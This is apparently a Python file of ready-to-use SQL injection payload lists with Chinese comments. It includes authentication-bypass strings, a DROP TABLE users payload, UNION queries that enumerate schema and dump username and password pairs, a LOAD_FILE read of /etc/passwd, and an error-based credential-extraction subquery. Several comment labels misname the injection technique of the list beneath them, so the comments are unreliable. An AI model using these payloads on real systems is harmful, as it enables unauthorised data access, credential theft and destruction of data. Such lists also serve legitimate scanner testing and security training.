# 常见的字符串注入有效载荷
StrInjectionList = ["""' OR 1=1 --""",
                    """" OR 1=1 --""",
                    """' OR '1'='1' --""",
                    """" OR "1"="1" --""",
                    """'; DROP TABLE users; --""", ]
# 基于布尔盲注的有效载荷
BoolenInjectionList = [
    """' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--""",
    """' AND 1=0 UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables WHERE table_schema=database()--""",
    """' AND 1=0 UNION ALL SELECT NULL,NULL,column_name FROM information_schema.columns WHERE table_name='users'--""", ]

# 基于报错注入的有效载荷
UnionInjectionList = [
    """' UNION ALL SELECT CONCAT(user,0x3a,password) FROM users--""",
    """' UNION ALL SELECT LOAD_FILE('/etc/passwd')--""", ]
# 基于堆叠查询的有效载荷
SelectInjectionList = [
    """' AND (SELECT COUNT(*) FROM users) > 0--""",
    """' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT CONCAT(username,':',password) FROM users LIMIT 0,1), FLOOR(RAND()*2)) AS dummy FROM information_schema.tables GROUP BY dummy) AS x)--""",
]
